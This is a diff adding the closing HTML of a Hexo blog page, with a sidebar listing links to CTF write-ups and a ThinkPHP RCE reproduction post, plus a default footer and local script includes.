+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/roarctf2019/">roarctf2019</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/sctf2020/">sctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tctf2020/">tctf2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/tp5rce%E5%A4%8D%E7%8E%B0/">tp5rce复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
